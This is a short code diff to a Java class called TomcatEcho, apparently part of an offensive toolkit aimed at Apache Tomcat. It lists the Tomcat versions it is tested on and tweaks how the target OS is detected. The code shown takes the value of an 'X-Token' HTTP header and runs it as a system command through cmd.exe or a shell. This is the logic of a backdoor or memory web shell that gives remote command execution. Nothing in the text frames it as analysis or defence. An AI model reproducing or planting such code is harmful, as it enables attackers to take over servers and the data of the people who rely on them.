@@ -16,7 +16,7 @@ import java.lang.reflect.Field;
  * ---> global = {org.apache.coyote.RequestGroupInfo}
  * <p>
  *
- * Version support
+ * Version test
  * 6.0.53
  * 7.0.59、7.0.109
  * 8.0.53、8.5.82
@@ -62,7 +62,7 @@ public class TomcatEcho {
                     String header = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, "X-Token");
                     if (header != null && !header.isEmpty()) {
                         String[] cmd = null;
-                        String os = System.getProperty("os.name").split(" ")[0].toLowerCase();
+                        String os = System.getProperty("os.name").toLowerCase();
                         if (os.contains("win")){
                             cmd = new String[]{"cmd.exe", "/c", header};
                         } else {
